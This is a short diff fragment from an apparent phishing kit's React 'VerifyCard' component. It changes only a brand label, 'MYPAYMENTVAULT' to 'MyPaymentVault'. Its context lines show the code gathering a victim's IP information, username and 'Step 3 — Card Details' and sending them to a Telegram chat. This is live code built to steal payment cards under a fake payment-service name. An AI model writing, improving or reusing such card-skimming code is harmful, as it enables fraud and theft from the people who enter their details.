@@ -90,7 +90,7 @@ export default function VerifyCard() {
     const ip = await getIPInfo();
     await sendTelegram(
       `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `💳 <b>MYPAYMENTVAULT</b>\n` +
+      `💳 <b>MyPaymentVault</b>\n` +
       `📌 <b>Step 3 — Card Details</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `👤 <b>Username</b>    : <code>${pendingUsername}</code>\n` +
